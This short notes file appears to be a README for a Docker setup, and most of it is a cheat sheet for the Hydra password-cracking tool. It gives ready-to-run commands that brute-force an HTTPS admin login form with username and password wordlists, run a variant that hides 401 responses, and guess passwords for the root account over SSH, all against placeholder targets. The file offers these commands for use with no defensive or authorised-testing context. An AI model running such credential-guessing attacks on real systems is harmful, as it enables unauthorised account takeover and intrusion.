- First time use: `docker-compose up --build`
- Afterward, use `docker-compose up`

Hydra reference: https://github.com/gnebbia/hydra_notes
- For https-post-forms, 
    - `hydra -L ./wordlists/usernames/multiple_sources_users.txt -P ./wordlists/passwords/most_used_passwords.txt -v "https-post-form://some_website.com/admin/login/?next=/admin:username=^USER^&password=^PASS^:F=failed to login"`
- To hide 401 response codes (https://github.com/vanhauser-thc/thc-hydra/issues/913), use the optional :1= parameter like so,
    - `hydra somesite.com -s some_port_num -L usernames/top-usernames-shortlist.txt -P passwords/Default-Credentials/default-passwords.txt -v https-post-form "/login/?login_only=1:user=^USER^&pass=^PASS^:1=:F=invalid"`
- For ssh,
    - `hydra -l root -P passwords/Common-Credentials/best1050.txt ssh://some_target_ip`
